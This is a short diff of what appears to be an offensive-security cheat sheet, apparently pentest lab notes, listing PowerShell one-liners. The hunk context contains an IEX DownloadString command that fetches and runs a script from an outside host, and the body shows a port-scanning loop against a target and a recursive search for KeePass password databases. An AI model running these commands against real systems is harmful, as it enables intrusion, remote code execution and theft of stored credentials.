@@ -16,3 +16,5 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/power
 `1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).connect("TARGET_IP", $_)) "TCP port $_ is open"} 2>$null` - This is a power shell one-liner that will scan the first 1024 ports of our target specified.
 
 `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` find all .kdbx files on the system (password databases used by password managers)
+
+``
